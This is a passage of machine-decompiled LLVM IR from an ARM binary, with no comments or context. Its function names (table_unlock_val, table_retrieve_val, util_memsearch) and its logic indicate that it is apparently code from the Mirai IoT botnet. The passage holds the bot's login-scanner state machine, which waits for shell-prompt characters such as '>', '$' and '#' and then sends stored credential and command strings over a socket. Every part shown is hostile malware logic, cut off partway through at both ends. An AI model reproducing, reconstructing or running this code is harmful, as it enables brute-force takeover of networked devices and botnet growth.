  %v2_fbc4 = inttoptr i32 %v1_fbc4 to i8*
  %v3_fbc4 = load i8, i8* %v2_fbc4, align 1
  %v4_fbc4 = zext i8 %v3_fbc4 to i32
  store i32 %v4_fbc4, i32* %r3.global-to-local, align 4
  %v2_fbc8 = icmp ugt i8 %v3_fbc4, 61
  store i1 %v2_fbc8, i1* %cpsr_c.global-to-local, align 1
  %v7_fbc8 = icmp eq i8 %v3_fbc4, 62
  store i1 %v7_fbc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fbc8, label %dec_label_pc_fc2c, label %bb441

bb441:                                            ; preds = %dec_label_pc_fbc0
  %v3_fbcc = icmp ugt i8 %v3_fbc4, 57
  store i1 %v3_fbcc, i1* %cpsr_c.global-to-local, align 1
  %v8_fbcc = icmp eq i8 %v3_fbc4, 58
  store i1 %v8_fbcc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fbcc, label %dec_label_pc_fc2c, label %dec_label_pc_fbd4

dec_label_pc_fbd4:                                ; preds = %bb441
  %v2_fbd4 = icmp ugt i8 %v3_fbc4, 35
  store i1 %v2_fbd4, i1* %cpsr_c.global-to-local, align 1
  %v7_fbd4 = icmp eq i8 %v3_fbc4, 36
  store i1 %v7_fbd4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fbd4, label %dec_label_pc_fc2c, label %dec_label_pc_fbdc

dec_label_pc_fbdc:                                ; preds = %dec_label_pc_fbd4
  %v2_fbdc = icmp ugt i8 %v3_fbc4, 34
  store i1 %v2_fbdc, i1* %cpsr_c.global-to-local, align 1
  %v7_fbdc = icmp eq i8 %v3_fbc4, 35
  store i1 %v7_fbdc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fbdc, label %dec_label_pc_fc2c, label %dec_label_pc_fbe4

dec_label_pc_fbe4:                                ; preds = %dec_label_pc_fbdc
  %v2_fbe4 = icmp ugt i8 %v3_fbc4, 36
  store i1 %v2_fbe4, i1* %cpsr_c.global-to-local, align 1
  %v7_fbe4 = icmp eq i8 %v3_fbc4, 37
  store i1 %v7_fbe4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fbe4, label %dec_label_pc_fc2c, label %dec_label_pc_fc14.preheader

dec_label_pc_fc14.preheader:                      ; preds = %dec_label_pc_fbe4
  %v3_fbe8 = add i32 %v0_f740, 28
  %v2_fbec = add i32 %v3_fbe8, %v3_fbb0
  store i32 %v2_fbec, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_fc14

dec_label_pc_fbf8:                                ; preds = %bb442
  %v2_fbf8 = icmp ugt i8 %v3_fc1c, 35
  store i1 %v2_fbf8, i1* %cpsr_c.global-to-local, align 1
  %v7_fbf8 = icmp eq i8 %v3_fc1c, 36
  store i1 %v7_fbf8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fbf8, label %dec_label_pc_fc2c, label %dec_label_pc_fc00

dec_label_pc_fc00:                                ; preds = %dec_label_pc_fbf8
  %v2_fc00 = icmp ugt i8 %v3_fc1c, 34
  store i1 %v2_fc00, i1* %cpsr_c.global-to-local, align 1
  %v7_fc00 = icmp eq i8 %v3_fc1c, 35
  store i1 %v7_fc00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fc00, label %dec_label_pc_fc2c, label %dec_label_pc_fc08

dec_label_pc_fc08:                                ; preds = %dec_label_pc_fc00
  %v2_fc08 = icmp ugt i8 %v3_fc1c, 36
  store i1 %v2_fc08, i1* %cpsr_c.global-to-local, align 1
  %v7_fc08 = icmp eq i8 %v3_fc1c, 37
  store i1 %v7_fc08, i1* %cpsr_z.global-to-local, align 1
  %v1_fc0c = add i32 %v0_fc0c, -1
  store i32 %v1_fc0c, i32* %r3.global-to-local, align 4
  br i1 %v7_fc08, label %dec_label_pc_fc2c, label %dec_label_pc_fc14

dec_label_pc_fc14:                                ; preds = %dec_label_pc_fc14.preheader, %dec_label_pc_fc08
  %v0_fc0c = phi i32 [ %v2_fbec, %dec_label_pc_fc14.preheader ], [ %v1_fc0c, %dec_label_pc_fc08 ]
  %v0_fc14 = phi i32 [ %v1_fbb4, %dec_label_pc_fc14.preheader ], [ %v1_fc14, %dec_label_pc_fc08 ]
  %v1_fc14 = add i32 %v0_fc14, -1
  store i32 %v1_fc14, i32* %r1.global-to-local, align 4
  %v2_fc14 = icmp ne i32 %v0_fc14, 0
  store i1 %v2_fc14, i1* %cpsr_c.global-to-local, align 1
  %v7_fc14 = icmp eq i32 %v0_fc14, 1
  store i1 %v7_fc14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fc14, label %dec_label_pc_f6c0.backedge.thread562, label %dec_label_pc_fc1c

dec_label_pc_fc1c:                                ; preds = %dec_label_pc_fc14
  %v1_fc1c = add i32 %v0_fc0c, -2
  %v2_fc1c = inttoptr i32 %v1_fc1c to i8*
  %v3_fc1c = load i8, i8* %v2_fc1c, align 1
  %v4_fc1c = zext i8 %v3_fc1c to i32
  store i32 %v4_fc1c, i32* %r2.global-to-local, align 4
  %v2_fc20 = icmp ugt i8 %v3_fc1c, 61
  store i1 %v2_fc20, i1* %cpsr_c.global-to-local, align 1
  %v7_fc20 = icmp eq i8 %v3_fc1c, 62
  store i1 %v7_fc20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fc20, label %dec_label_pc_fc2c, label %bb442

bb442:                                            ; preds = %dec_label_pc_fc1c
  %v3_fc24 = icmp ugt i8 %v3_fc1c, 57
  store i1 %v3_fc24, i1* %cpsr_c.global-to-local, align 1
  %v8_fc24 = icmp eq i8 %v3_fc1c, 58
  store i1 %v8_fc24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fc24, label %dec_label_pc_fc2c, label %dec_label_pc_fbf8

dec_label_pc_fc2c:                                ; preds = %dec_label_pc_fc1c, %bb442, %dec_label_pc_fc08, %dec_label_pc_fc00, %dec_label_pc_fbf8, %dec_label_pc_fbe4, %dec_label_pc_fbc0, %dec_label_pc_fbdc, %dec_label_pc_fbd4, %bb441
  %v0_fc30 = phi i32 [ %v1_fbb4, %dec_label_pc_fbe4 ], [ %v1_fbb4, %dec_label_pc_fbc0 ], [ %v1_fbb4, %dec_label_pc_fbdc ], [ %v1_fbb4, %dec_label_pc_fbd4 ], [ %v1_fbb4, %bb441 ], [ %v1_fc14, %dec_label_pc_fbf8 ], [ %v1_fc14, %dec_label_pc_fc00 ], [ %v1_fc14, %dec_label_pc_fc08 ], [ %v1_fc14, %bb442 ], [ %v1_fc14, %dec_label_pc_fc1c ]
  %v1_fc30 = add i32 %v0_fc30, 1
  store i32 %v1_fc30, i32* @r7, align 4
  %v1_fc34 = call i32 @table_unlock_val(i32 7)
  store i32 %v2_1001c, i32* %r1.global-to-local, align 4
  %v3_fc44 = call i32 @table_retrieve_val(i32 7, i32* nonnull %stack_var_-60)
  %v3_fc48 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_fc48, i32* %r2.global-to-local, align 4
  store i32 %v3_fc44, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_fc54 = load i32, i32* @r6, align 4
  %v1_fc54 = add i32 %v0_fc54, 4
  %v2_fc54 = inttoptr i32 %v1_fc54 to i32*
  %v3_fc54 = load i32, i32* %v2_fc54, align 4
  %v4_fc58 = call i32 @__libc_send(i32 %v3_fc54, i32 %v3_fc44, i32 %v3_fc48, i32 16384)
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19b10.208 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_fc68 = load i32, i32* @r6, align 4
  %v1_fc68 = add i32 %v0_fc68, 4
  %v2_fc68 = inttoptr i32 %v1_fc68 to i32*
  %v3_fc68 = load i32, i32* %v2_fc68, align 4
  %v4_fc6c = call i32 @__libc_send(i32 %v3_fc68, i32 ptrtoint ([3 x i8]* @global_var_19b10.208 to i32), i32 2, i32 16384)
  %v1_fc74 = call i32 @table_lock_val(i32 7)
  store i32 6, i32* @r3, align 4
  %v1_fc7c = load i32, i32* @r6, align 4
  %v2_fc7c = add i32 %v1_fc7c, 12
  %v3_fc7c = inttoptr i32 %v2_fc7c to i32*
  store i32 6, i32* %v3_fc7c, align 4
  br label %dec_label_pc_f910

dec_label_pc_fc84:                                ; preds = %dec_label_pc_f740
  %v1_fc84 = add i32 %v0_f740, 24
  %v2_fc84 = inttoptr i32 %v1_fc84 to i32*
  %v3_fc84 = load i32, i32* %v2_fc84, align 4
  store i32 %v3_fc84, i32* %r2.global-to-local, align 4
  %v1_fc88 = add i32 %v3_fc84, -1
  store i32 %v1_fc88, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fc8c = icmp eq i32 %v1_fc88, 0
  store i1 %v2_fc8c, i1* %cpsr_z.global-to-local, align 1
  %tmp443 = icmp slt i32 %v1_fc88, 1
  br i1 %tmp443, label %dec_label_pc_f6c0.backedge.thread, label %dec_label_pc_fc94

dec_label_pc_fc94:                                ; preds = %dec_label_pc_fc84
  %v2_fc94 = add i32 %v1_fc88, %v0_f740
  store i32 %v2_fc94, i32* %r3.global-to-local, align 4
  %v1_fc98 = add i32 %v2_fc94, 28
  %v2_fc98 = inttoptr i32 %v1_fc98 to i8*
  %v3_fc98 = load i8, i8* %v2_fc98, align 1
  %v4_fc98 = zext i8 %v3_fc98 to i32
  store i32 %v4_fc98, i32* %r3.global-to-local, align 4
  %v2_fc9c = icmp ugt i8 %v3_fc98, 61
  store i1 %v2_fc9c, i1* %cpsr_c.global-to-local, align 1
  %v7_fc9c = icmp eq i8 %v3_fc98, 62
  store i1 %v7_fc9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fc9c, label %dec_label_pc_fd74, label %bb444

bb444:                                            ; preds = %dec_label_pc_fc94
  %v3_fca0 = icmp ugt i8 %v3_fc98, 57
  store i1 %v3_fca0, i1* %cpsr_c.global-to-local, align 1
  %v8_fca0 = icmp eq i8 %v3_fc98, 58
  store i1 %v8_fca0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fca0, label %dec_label_pc_fd74, label %dec_label_pc_fca8

dec_label_pc_fca8:                                ; preds = %bb444
  %v2_fca8 = icmp ugt i8 %v3_fc98, 35
  store i1 %v2_fca8, i1* %cpsr_c.global-to-local, align 1
  %v7_fca8 = icmp eq i8 %v3_fc98, 36
  store i1 %v7_fca8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fca8, label %dec_label_pc_fd74, label %dec_label_pc_fcb0

dec_label_pc_fcb0:                                ; preds = %dec_label_pc_fca8
  %v2_fcb0 = icmp ugt i8 %v3_fc98, 34
  store i1 %v2_fcb0, i1* %cpsr_c.global-to-local, align 1
  %v7_fcb0 = icmp eq i8 %v3_fc98, 35
  store i1 %v7_fcb0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fcb0, label %dec_label_pc_fd74, label %dec_label_pc_fcb8

dec_label_pc_fcb8:                                ; preds = %dec_label_pc_fcb0
  %v2_fcb8 = icmp ugt i8 %v3_fc98, 36
  store i1 %v2_fcb8, i1* %cpsr_c.global-to-local, align 1
  %v7_fcb8 = icmp eq i8 %v3_fc98, 37
  store i1 %v7_fcb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fcb8, label %dec_label_pc_fd74, label %dec_label_pc_fd5c.preheader

dec_label_pc_fd5c.preheader:                      ; preds = %dec_label_pc_fcb8
  %v3_fcbc = add i32 %v0_f740, 28
  %v2_fcc0 = add i32 %v3_fcbc, %v3_fc84
  store i32 %v2_fcc0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_fd5c

dec_label_pc_fd40:                                ; preds = %bb445
  %v2_fd40 = icmp ugt i8 %v3_fd64, 35
  store i1 %v2_fd40, i1* %cpsr_c.global-to-local, align 1
  %v7_fd40 = icmp eq i8 %v3_fd64, 36
  store i1 %v7_fd40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fd40, label %dec_label_pc_fd74, label %dec_label_pc_fd48

dec_label_pc_fd48:                                ; preds = %dec_label_pc_fd40
  %v2_fd48 = icmp ugt i8 %v3_fd64, 34
  store i1 %v2_fd48, i1* %cpsr_c.global-to-local, align 1
  %v7_fd48 = icmp eq i8 %v3_fd64, 35
  store i1 %v7_fd48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fd48, label %dec_label_pc_fd74, label %dec_label_pc_fd50

dec_label_pc_fd50:                                ; preds = %dec_label_pc_fd48
  %v2_fd50 = icmp ugt i8 %v3_fd64, 36
  store i1 %v2_fd50, i1* %cpsr_c.global-to-local, align 1
  %v7_fd50 = icmp eq i8 %v3_fd64, 37
  store i1 %v7_fd50, i1* %cpsr_z.global-to-local, align 1
  %v1_fd54 = add i32 %v0_fd54, -1
  store i32 %v1_fd54, i32* %r3.global-to-local, align 4
  br i1 %v7_fd50, label %dec_label_pc_fd74, label %dec_label_pc_fd5c

dec_label_pc_fd5c:                                ; preds = %dec_label_pc_fd5c.preheader, %dec_label_pc_fd50
  %v0_fd54 = phi i32 [ %v2_fcc0, %dec_label_pc_fd5c.preheader ], [ %v1_fd54, %dec_label_pc_fd50 ]
  %v0_fd5c = phi i32 [ %v1_fc88, %dec_label_pc_fd5c.preheader ], [ %v1_fd5c, %dec_label_pc_fd50 ]
  %v1_fd5c = add i32 %v0_fd5c, -1
  store i32 %v1_fd5c, i32* %r1.global-to-local, align 4
  %v2_fd5c = icmp ne i32 %v0_fd5c, 0
  store i1 %v2_fd5c, i1* %cpsr_c.global-to-local, align 1
  %v7_fd5c = icmp eq i32 %v0_fd5c, 1
  store i1 %v7_fd5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fd5c, label %dec_label_pc_f6c0.backedge.thread562, label %dec_label_pc_fd64

dec_label_pc_fd64:                                ; preds = %dec_label_pc_fd5c
  %v1_fd64 = add i32 %v0_fd54, -2
  %v2_fd64 = inttoptr i32 %v1_fd64 to i8*
  %v3_fd64 = load i8, i8* %v2_fd64, align 1
  %v4_fd64 = zext i8 %v3_fd64 to i32
  store i32 %v4_fd64, i32* %r2.global-to-local, align 4
  %v2_fd68 = icmp ugt i8 %v3_fd64, 61
  store i1 %v2_fd68, i1* %cpsr_c.global-to-local, align 1
  %v7_fd68 = icmp eq i8 %v3_fd64, 62
  store i1 %v7_fd68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fd68, label %dec_label_pc_fd74, label %bb445

bb445:                                            ; preds = %dec_label_pc_fd64
  %v3_fd6c = icmp ugt i8 %v3_fd64, 57
  store i1 %v3_fd6c, i1* %cpsr_c.global-to-local, align 1
  %v8_fd6c = icmp eq i8 %v3_fd64, 58
  store i1 %v8_fd6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fd6c, label %dec_label_pc_fd74, label %dec_label_pc_fd40

dec_label_pc_fd74:                                ; preds = %dec_label_pc_fd64, %bb445, %dec_label_pc_fd50, %dec_label_pc_fd48, %dec_label_pc_fd40, %dec_label_pc_fcb8, %dec_label_pc_fc94, %dec_label_pc_fcb0, %dec_label_pc_fca8, %bb444
  %v0_fd78 = phi i32 [ %v1_fc88, %dec_label_pc_fcb8 ], [ %v1_fc88, %dec_label_pc_fc94 ], [ %v1_fc88, %dec_label_pc_fcb0 ], [ %v1_fc88, %dec_label_pc_fca8 ], [ %v1_fc88, %bb444 ], [ %v1_fd5c, %dec_label_pc_fd40 ], [ %v1_fd5c, %dec_label_pc_fd48 ], [ %v1_fd5c, %dec_label_pc_fd50 ], [ %v1_fd5c, %bb445 ], [ %v1_fd5c, %dec_label_pc_fd64 ]
  %v1_fd78 = add i32 %v0_fd78, 1
  store i32 %v1_fd78, i32* @r7, align 4
  %v1_fd7c = call i32 @table_unlock_val(i32 9)
  store i32 %v2_1001c, i32* %r1.global-to-local, align 4
  %v3_fd8c = call i32 @table_retrieve_val(i32 9, i32* nonnull %stack_var_-60)
  %v3_fd90 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_fd90, i32* %r2.global-to-local, align 4
  store i32 %v3_fd8c, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_fd9c = load i32, i32* @r6, align 4
  %v1_fd9c = add i32 %v0_fd9c, 4
  %v2_fd9c = inttoptr i32 %v1_fd9c to i32*
  %v3_fd9c = load i32, i32* %v2_fd9c, align 4
  %v4_fda0 = call i32 @__libc_send(i32 %v3_fd9c, i32 %v3_fd8c, i32 %v3_fd90, i32 16384)
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19b10.208 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_fdb0 = load i32, i32* @r6, align 4
  %v1_fdb0 = add i32 %v0_fdb0, 4
  %v2_fdb0 = inttoptr i32 %v1_fdb0 to i32*
  %v3_fdb0 = load i32, i32* %v2_fdb0, align 4
  %v4_fdb4 = call i32 @__libc_send(i32 %v3_fdb0, i32 ptrtoint ([3 x i8]* @global_var_19b10.208 to i32), i32 2, i32 16384)
  %v1_fdbc = call i32 @table_lock_val(i32 9)
  store i32 9, i32* @r3, align 4
  %v1_fdc4 = load i32, i32* @r6, align 4
  %v2_fdc4 = add i32 %v1_fdc4, 12
  %v3_fdc4 = inttoptr i32 %v2_fdc4 to i32*
  store i32 9, i32* %v3_fdc4, align 4
  br label %dec_label_pc_f910

dec_label_pc_fdcc:                                ; preds = %dec_label_pc_f740
  %v1_fdcc = add i32 %v0_f740, 24
  %v2_fdcc = inttoptr i32 %v1_fdcc to i32*
  %v3_fdcc = load i32, i32* %v2_fdcc, align 4
  store i32 %v3_fdcc, i32* %r2.global-to-local, align 4
  %v1_fdd0 = add i32 %v3_fdcc, -1
  store i32 %v1_fdd0, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fdd4 = icmp eq i32 %v1_fdd0, 0
  store i1 %v2_fdd4, i1* %cpsr_z.global-to-local, align 1
  %tmp446 = icmp slt i32 %v1_fdd0, 1
  br i1 %tmp446, label %dec_label_pc_fe38, label %dec_label_pc_fddc

dec_label_pc_fddc:                                ; preds = %dec_label_pc_fdcc
  %v2_fddc = add i32 %v1_fdd0, %v0_f740
  store i32 %v2_fddc, i32* %r3.global-to-local, align 4
  %v1_fde0 = add i32 %v2_fddc, 28
  %v2_fde0 = inttoptr i32 %v1_fde0 to i8*
  %v3_fde0 = load i8, i8* %v2_fde0, align 1
  %v4_fde0 = zext i8 %v3_fde0 to i32
  store i32 %v4_fde0, i32* %r3.global-to-local, align 4
  %v2_fde4 = icmp ugt i8 %v3_fde0, 61
  store i1 %v2_fde4, i1* %cpsr_c.global-to-local, align 1
  %v7_fde4 = icmp eq i8 %v3_fde0, 62
  store i1 %v7_fde4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fde4, label %dec_label_pc_1016c, label %bb447

bb447:                                            ; preds = %dec_label_pc_fddc
  %v3_fde8 = icmp ugt i8 %v3_fde0, 57
  store i1 %v3_fde8, i1* %cpsr_c.global-to-local, align 1
  %v8_fde8 = icmp eq i8 %v3_fde0, 58
  store i1 %v8_fde8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fde8, label %dec_label_pc_1016c, label %dec_label_pc_fdf0

dec_label_pc_fdf0:                                ; preds = %bb447
  %v2_fdf0 = icmp ugt i8 %v3_fde0, 35
  store i1 %v2_fdf0, i1* %cpsr_c.global-to-local, align 1
  %v7_fdf0 = icmp eq i8 %v3_fde0, 36
  store i1 %v7_fdf0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fdf0, label %dec_label_pc_1016c, label %dec_label_pc_fdf8

dec_label_pc_fdf8:                                ; preds = %dec_label_pc_fdf0
  %v2_fdf8 = icmp ugt i8 %v3_fde0, 34
  store i1 %v2_fdf8, i1* %cpsr_c.global-to-local, align 1
  %v7_fdf8 = icmp eq i8 %v3_fde0, 35
  store i1 %v7_fdf8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fdf8, label %dec_label_pc_1016c, label %dec_label_pc_fe30.preheader

dec_label_pc_fe30.preheader:                      ; preds = %dec_label_pc_fdf8
  %v3_fdfc = add i32 %v0_f740, 28
  %v2_fe00 = add i32 %v3_fdfc, %v3_fdcc
  store i32 %v2_fe00, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_fe30

dec_label_pc_fe0c:                                ; preds = %dec_label_pc_fe30
  %v1_fe0c = add i32 %v0_fe28, -2
  %v2_fe0c = inttoptr i32 %v1_fe0c to i8*
  %v3_fe0c = load i8, i8* %v2_fe0c, align 1
  %v4_fe0c = zext i8 %v3_fe0c to i32
  store i32 %v4_fe0c, i32* %r2.global-to-local, align 4
  %v2_fe10 = icmp ugt i8 %v3_fe0c, 61
  store i1 %v2_fe10, i1* %cpsr_c.global-to-local, align 1
  %v7_fe10 = icmp eq i8 %v3_fe0c, 62
  store i1 %v7_fe10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fe10, label %dec_label_pc_1016c, label %bb448

bb448:                                            ; preds = %dec_label_pc_fe0c
  %v3_fe14 = icmp ugt i8 %v3_fe0c, 57
  store i1 %v3_fe14, i1* %cpsr_c.global-to-local, align 1
  %v8_fe14 = icmp eq i8 %v3_fe0c, 58
  store i1 %v8_fe14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fe14, label %dec_label_pc_1016c, label %dec_label_pc_fe1c

dec_label_pc_fe1c:                                ; preds = %bb448
  %v2_fe1c = icmp ugt i8 %v3_fe0c, 35
  store i1 %v2_fe1c, i1* %cpsr_c.global-to-local, align 1
  %v7_fe1c = icmp eq i8 %v3_fe0c, 36
  store i1 %v7_fe1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fe1c, label %dec_label_pc_1016c, label %dec_label_pc_fe24

dec_label_pc_fe24:                                ; preds = %dec_label_pc_fe1c
  %v2_fe24 = icmp ugt i8 %v3_fe0c, 34
  store i1 %v2_fe24, i1* %cpsr_c.global-to-local, align 1
  %v7_fe24 = icmp eq i8 %v3_fe0c, 35
  store i1 %v7_fe24, i1* %cpsr_z.global-to-local, align 1
  %v1_fe28 = add i32 %v0_fe28, -1
  store i32 %v1_fe28, i32* %r3.global-to-local, align 4
  br i1 %v7_fe24, label %dec_label_pc_1016c, label %dec_label_pc_fe30

dec_label_pc_fe30:                                ; preds = %dec_label_pc_fe30.preheader, %dec_label_pc_fe24
  %v0_fe28 = phi i32 [ %v2_fe00, %dec_label_pc_fe30.preheader ], [ %v1_fe28, %dec_label_pc_fe24 ]
  %v0_fe30 = phi i32 [ %v1_fdd0, %dec_label_pc_fe30.preheader ], [ %v1_fe30, %dec_label_pc_fe24 ]
  %v1_fe30 = add i32 %v0_fe30, -1
  store i32 %v1_fe30, i32* %r1.global-to-local, align 4
  %v2_fe30 = icmp ne i32 %v0_fe30, 0
  store i1 %v2_fe30, i1* %cpsr_c.global-to-local, align 1
  %v7_fe30 = icmp eq i32 %v0_fe30, 1
  store i1 %v7_fe30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fe30, label %dec_label_pc_fe38, label %dec_label_pc_fe0c

dec_label_pc_fe38:                                ; preds = %dec_label_pc_fe30, %dec_label_pc_fdcc
  %v1_fe3c = call i32 @table_unlock_val(i32 30)
  store i32 %v2_1001c, i32* %r1.global-to-local, align 4
  %v3_fe4c = call i32 @table_retrieve_val(i32 30, i32* nonnull %stack_var_-60)
  %v3_fe50 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_fe4c, i32* %r2.global-to-local, align 4
  %v1_fe58 = add i32 %v3_fe50, -1
  store i32 %v1_fe58, i32* %r3.global-to-local, align 4
  %v0_fe5c = load i32, i32* @fp, align 4
  %v0_fe60 = load i32, i32* @r6, align 4
  %v1_fe60 = add i32 %v0_fe60, 24
  %v2_fe60 = inttoptr i32 %v1_fe60 to i32*
  %v3_fe60 = load i32, i32* %v2_fe60, align 4
  store i32 %v3_fe60, i32* %r1.global-to-local, align 4
  %v4_fe64 = call i32 @util_memsearch(i32 %v0_fe5c, i32 %v3_fe60, i32 %v3_fe4c, i32 %v1_fe58)
  %v1_fe68 = add i32 %v4_fe64, 1
  store i32 %v1_fe68, i32* @r7, align 4
  %v2_fe68 = icmp eq i32 %v4_fe64, -1
  store i1 %v2_fe68, i1* %cpsr_c.global-to-local, align 1
  %v7_fe68 = icmp eq i32 %v1_fe68, 0
  store i1 %v7_fe68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fe68, label %dec_label_pc_10420.loopexit, label %dec_label_pc_fe78

dec_label_pc_fe78:                                ; preds = %dec_label_pc_fe38
  store i32 1, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  %v1_fe7c = call i32 @table_lock_val(i32 30)
  br label %dec_label_pc_fe80

dec_label_pc_fe80:                                ; preds = %dec_label_pc_1016c, %dec_label_pc_fe78
  %v0_fe80 = load i32, i32* @r6, align 4
  %v1_fe80 = inttoptr i32 %v0_fe80 to i32*
  %v2_fe80 = load i32, i32* %v1_fe80, align 4
  store i32 %v2_fe80, i32* %r3.global-to-local, align 4
  %v1_fe84 = add i32 %v0_fe80, 4
  %v2_fe84 = inttoptr i32 %v1_fe84 to i32*
  %v3_fe84 = load i32, i32* %v2_fe84, align 4
  %v1_fe88 = add i32 %v2_fe80, 13
  %v2_fe88 = inttoptr i32 %v1_fe88 to i8*
  %v3_fe88 = load i8, i8* %v2_fe88, align 1
  %v4_fe88 = zext i8 %v3_fe88 to i32
  store i32 %v4_fe88, i32* %r2.global-to-local, align 4
  %v1_fe8c = add i32 %v2_fe80, 4
  %v2_fe8c = inttoptr i32 %v1_fe8c to i32*
  %v3_fe8c = load i32, i32* %v2_fe8c, align 4
  store i32 %v3_fe8c, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_fe94 = call i32 @__libc_send(i32 %v3_fe84, i32 %v3_fe8c, i32 %v4_fe88, i32 16384)
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_fe9c = load i32, i32* @r6, align 4
  %v1_fe9c = add i32 %v0_fe9c, 4
  %v2_fe9c = inttoptr i32 %v1_fe9c to i32*
  %v3_fe9c = load i32, i32* %v2_fe9c, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19b10.208 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_fea8 = call i32 @__libc_send(i32 %v3_fe9c, i32 ptrtoint ([3 x i8]* @global_var_19b10.208 to i32), i32 2, i32 16384)
  store i32 5, i32* @r3, align 4
  %v1_feb0 = load i32, i32* @r6, align 4
  %v2_feb0 = add i32 %v1_feb0, 12
  %v3_feb0 = inttoptr i32 %v2_feb0 to i32*
  store i32 5, i32* %v3_feb0, align 4
  br label %dec_label_pc_f908

dec_label_pc_feb8:                                ; preds = %dec_label_pc_f740
  %v1_feb8 = add i32 %v0_f740, 24
  %v2_feb8 = inttoptr i32 %v1_feb8 to i32*
  %v3_feb8 = load i32, i32* %v2_feb8, align 4
  store i32 %v3_feb8, i32* %r2.global-to-local, align 4
  %v1_febc = add i32 %v3_feb8, -1
  store i32 %v1_febc, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fec0 = icmp eq i32 %v1_febc, 0
  store i1 %v2_fec0, i1* %cpsr_z.global-to-local, align 1
  %tmp449 = icmp slt i32 %v1_febc, 1
  br i1 %tmp449, label %dec_label_pc_f6c0.backedge.thread, label %dec_label_pc_fec8

dec_label_pc_fec8:                                ; preds = %dec_label_pc_feb8
  %v2_fec8 = add i32 %v1_febc, %v0_f740
  store i32 %v2_fec8, i32* %r3.global-to-local, align 4
  %v1_fecc = add i32 %v2_fec8, 28
  %v2_fecc = inttoptr i32 %v1_fecc to i8*
  %v3_fecc = load i8, i8* %v2_fecc, align 1
  %v4_fecc = zext i8 %v3_fecc to i32
  store i32 %v4_fecc, i32* %r3.global-to-local, align 4
  %v2_fed0 = icmp ugt i8 %v3_fecc, 61
  store i1 %v2_fed0, i1* %cpsr_c.global-to-local, align 1
  %v7_fed0 = icmp eq i8 %v3_fecc, 62
  store i1 %v7_fed0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fed0, label %dec_label_pc_ff34, label %bb450

bb450:                                            ; preds = %dec_label_pc_fec8
  %v3_fed4 = icmp ugt i8 %v3_fecc, 57
  store i1 %v3_fed4, i1* %cpsr_c.global-to-local, align 1
  %v8_fed4 = icmp eq i8 %v3_fecc, 58
  store i1 %v8_fed4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fed4, label %dec_label_pc_ff34, label %dec_label_pc_fedc

dec_label_pc_fedc:                                ; preds = %bb450
  %v2_fedc = icmp ugt i8 %v3_fecc, 35
  store i1 %v2_fedc, i1* %cpsr_c.global-to-local, align 1
  %v7_fedc = icmp eq i8 %v3_fecc, 36
  store i1 %v7_fedc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fedc, label %dec_label_pc_ff34, label %dec_label_pc_fee4

dec_label_pc_fee4:                                ; preds = %dec_label_pc_fedc
  %v2_fee4 = icmp ugt i8 %v3_fecc, 34
  store i1 %v2_fee4, i1* %cpsr_c.global-to-local, align 1
  %v7_fee4 = icmp eq i8 %v3_fecc, 35
  store i1 %v7_fee4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fee4, label %dec_label_pc_ff34, label %dec_label_pc_feec

dec_label_pc_feec:                                ; preds = %dec_label_pc_fee4
  %v2_feec = icmp ugt i8 %v3_fecc, 36
